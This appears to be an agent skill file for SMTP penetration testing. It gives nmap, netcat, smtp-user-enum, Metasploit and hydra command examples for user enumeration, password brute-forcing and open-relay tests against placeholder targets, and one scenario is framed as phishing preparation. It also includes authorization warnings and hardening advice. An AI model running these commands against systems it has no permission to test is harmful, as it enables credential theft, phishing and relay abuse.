---
name: smtp-penetration-testing
description: "Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# SMTP Penetration Testing

## Detailed Guide

Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.

## Prerequisites

### Required Tools
```bash
# Nmap with SMTP scripts
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra for brute force
sudo apt-get install hydra

# SMTP user enumeration tool
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### Required Knowledge
- SMTP protocol fundamentals
- Email architecture (MTA, MDA, MUA)
- DNS and MX records
- Network protocols

### Required Access
- Target SMTP server IP/hostname
- Written authorization for testing
- Wordlists for enumeration and brute force

## Constraints and Limitations

### Legal Requirements
- Only test SMTP servers you own or have authorization to test
- Sending spam or malicious emails is illegal
- Document all testing activities
- Do not abuse discovered open relays

### Technical Limitations
- VRFY/EXPN often disabled on modern servers
- Rate limiting may slow enumeration
- Some servers respond identically for valid/invalid users
- Greylisting may delay enumeration responses

### Ethical Boundaries
- Never send actual spam through discovered relays
- Do not harvest email addresses for malicious use
- Report open relays to server administrators
- Use findings only for authorized security improvement

## Examples

### Example 1: Complete SMTP Assessment

**Scenario:** Full security assessment of mail server

```bash
# Step 1: Service discovery
nmap -sV -sC -p 25,465,587 mail.target.com

# Step 2: Banner grab
nc mail.target.com 25
EHLO test.com
QUIT

# Step 3: User enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# Step 4: Open relay test
nmap -p 25 --script smtp-open-relay mail.target.com

# Step 5: Authentication test
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# Step 6: TLS check
openssl s_client -connect mail.target.com:25 -starttls smtp

# Step 7: Check email authentication
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### Example 2: User Enumeration Attack

**Scenario:** Enumerate valid users for phishing preparation

```bash
# Method 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Method 2: RCPT with timing analysis
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Method 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Results show valid users
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### Example 3: Open Relay Exploitation

**Scenario:** Test and document open relay vulnerability

```bash
# Test via Telnet
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# If 250 OK - VULNERABLE

# Document with Nmap
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# Output:
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## Security Recommendations

### For Administrators

1. **Disable Open Relay** - Require authentication for external delivery
2. **Disable VRFY/EXPN** - Prevent user enumeration
3. **Enforce TLS** - Require STARTTLS for all connections
4. **Implement SPF/DKIM/DMARC** - Prevent email spoofing
5. **Rate Limiting** - Prevent brute force attacks
6. **Account Lockout** - Lock accounts after failed attempts
7. **Banner Hardening** - Minimize server information disclosure
8. **Log Monitoring** - Alert on suspicious activity
9. **Patch Management** - Keep SMTP software updated
10. **Access Controls** - Restrict SMTP to authorized IPs

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
